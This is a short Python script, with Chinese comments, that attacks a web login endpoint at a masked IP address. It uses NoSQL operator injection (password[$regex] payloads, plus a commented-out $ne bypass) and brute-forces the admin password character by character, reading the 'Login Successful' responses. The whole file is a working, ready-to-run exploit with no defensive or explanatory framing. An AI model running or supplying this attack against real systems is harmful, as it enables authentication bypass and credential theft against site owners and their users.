#coding=utf-8
import requests


printable="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{\}"
username=""


def requester(s, i):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    }

    # 受攻击的url
    target = "http://***.***.***.***/api/login"
    
    # 构建payload
    #payload = "username[$regex]=" + s + ".{" + str(i) + "}&password[$ne]=1"
    payload = "username=admin&password[$regex]="+s+".{"+str(i)+"}"

    r = requests.post(target, data=payload, headers=headers, verify=False, allow_redirects=False)

    if "Login Successful" in r. text:
        return True
    else:
        return False


for i in range(50,-1,-1):
    for s in printable:
        if s not in ['*','+','.','?','|']:
            if requester(username+s, i):
                username=username+s
                print(username)
                break
